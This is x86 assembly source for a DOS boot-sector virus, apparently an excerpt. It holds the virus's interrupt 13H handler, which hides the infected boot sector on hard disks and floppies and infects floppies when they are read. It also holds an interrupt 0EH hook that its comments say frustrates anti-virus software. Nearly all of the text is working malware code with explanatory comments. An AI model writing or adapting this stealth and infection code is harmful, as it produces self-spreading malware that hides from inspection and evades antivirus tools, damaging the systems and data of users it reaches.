;*******************************************************************************
;* INTERRUPT 13H HANDLER                                                       *
;*******************************************************************************

OLD_13H DD      ?                       ;Old interrupt 13H vector goes here

INT_13H:
        sti
        cmp     ah,2                    ;we want to intercept reads
        jz      READ_FUNCTION
        mov     BYTE PTR cs:[INSIDE],1
        pushf
        call    DWORD PTR cs:[OLD_13H]
        mov     BYTE PTR cs:[INSIDE],0
        retf    2

;*******************************************************************************
;This section of code handles all attempts to access the Disk BIOS Function 2.
;It stealths the boot sector on both hard disks and floppy disks, by
;re-directing the read to the original boot sector. It handles multi-sector
;reads properly, by dividing the read into two parts. If an attempt is
;made to read the boot sector on the floppy, and the motor is off, this
;routine will check to see if the floppy has been infected, and if not, it
;will infect it.
READ_FUNCTION:                                  ;Disk Read Function Handler
        mov     BYTE PTR cs:[INSIDE],1          ;set INSIDE flag
        cmp     dh,0                            ;is it a read on head 0?
        jnz     ROM_BIOS                        ;nope, we're not interested
        cmp     dl,80H                          ;is this a hard disk read?
        jc      READ_FLOPPY                     ;no, go handle floppy


;This routine stealths the hard disk. It's really pretty simple, since all it
;has to do is add VIR_SIZE+1 to the sector number being read, provided the
;sector being read is somewhere in the virus. That moves a read of the
;master boot sector out to the original master boot record, and it moves
;all other sector reads out past where the virus is, presumably returning
;blank data.
READ_HARD:                                      ;else handle hard disk
        cmp     cx,VIR_SIZE+3                   ;is it cyl 0, sec < VIR_SIZE + 3?
        jnc     ROM_BIOS                        ;no, let BIOS handle it
        push    cx
        add     cx,VIR_SIZE+1                   ;adjust sec no (stealth)
        pushf                                   ;and read from here instead
        call    DWORD PTR cs:[OLD_13H]          ;call ROM BIOS
        pop     cx                              ;restore original sec no
        mov     BYTE PTR cs:[INSIDE],0          ;reset INSIDE flag
        retf    2                               ;and return to caller

ROM_BIOS:                                       ;call ROM BIOS disk handler
        pushf
        call    DWORD PTR cs:[OLD_13H]
        mov     BYTE PTR cs:[INSIDE],0          ;reset this flag
        retf    2                               ;and return to caller


;This handles reading from the floppy, which is a bit more complex. For one,
;we can't know where the original boot sector is, unless we first read the
;viral one and get that information out of it. Secondly, a multi-sector
;read must return with the FAT in the second sector, etc.
READ_FLOPPY:
        cmp     cx,1                            ;is it cylinder 0, sector 1?
        jnz     ROM_BIOS                        ;no, let BIOS handle it
        mov     cs:[CURR_DISK],dl               ;save currently accessed drive #
        call    CHECK_DISK                      ;is floppy already infected?
        jz      FLOPPY_STEALTH                  ;yes, stealth the read

        call    INIT_FAT_MANAGER                ;initialize FAT management routines
        call    INFECT_FLOPPY                   ;no, go infect the diskette
RF2:    call    CHECK_DISK                      ;see if infection took
        jnz     ROM_BIOS                        ;no, no stealth required, go to BIOS

;If we get here, we need stealth.
FLOPPY_STEALTH:
        int     40H                             ;read requested sectors
        mov     cs:[REPORT],ax                  ;save returned ax value here
        jnc     BOOT_SECTOR                     ;and read boot sec if no error
        mov     al,0                            ;error, return with al=0
        mov     BYTE PTR cs:[INSIDE],0          ;reset INSIDE flag
        retf    2                               ;and carry set

;This routine reads the original boot sector.
BOOT_SECTOR:
        mov     cx,WORD PTR es:[bx + 3EH]       ;cx, dh locate start of
        mov     dh,BYTE PTR es:[bx + 41H]       ;main body of virus
        add     cl,VIR_SIZE                     ;update to find orig boot sec
        cmp     cl,BYTE PTR cs:[BS_SECS_PER_TRACK]          ;this procedure works
        jbe     BS1                             ;as long as
        sub     cl,BYTE PTR cs:[BS_SECS_PER_TRACK]          ;VIR_SIZE<=BS_SECS_PER_TRACK
        xor     dh,1
        jnz     BS1
        inc     ch
BS1:    mov     ax,201H                         ;read original boot sector
        int     40H                             ;using BIOS floppy disk
        mov     cx,1                            ;restore cx and dh
        mov     dh,0
        jc      EXNOW                           ;error, exit now
        mov     ax,cs:[REPORT]
EXNOW:  mov     BYTE PTR cs:[INSIDE],0          ;reset INSIDE flag
        retf    2                               ;and exit to caller


REPORT  DW      ?                       ;value reported to caller in ax
INSIDE  DB      0                       ;flag indicates we're inside int 13 hook

;*******************************************************************************
;This routine handles the floppy disk hardware Interrupt 0EH. Basically, it
;just passes control to the old handler as long as the INSIDE flag is one. If
;the INSIDE flag is zero, though, it returns to the caller without doing
;anything. This frustrates attempts to go around INT 13H by anti-virus software.

OLD_0EH DD      ?                               ;old INT 0EH handler vector

INT_0EH:
        cmp     BYTE PTR cs:[INSIDE],1          ;is INSIDE = 1 ?
        jne     INTERET                         ;nope, just return to caller
        jmp     DWORD PTR cs:[OLD_0EH]          ;else go to old handler

INTERET:push    ax
        mov     al,20H                          ;release interrupt controller
        out     20H,al
        pop     ax
        iret                                    ;and return to caller

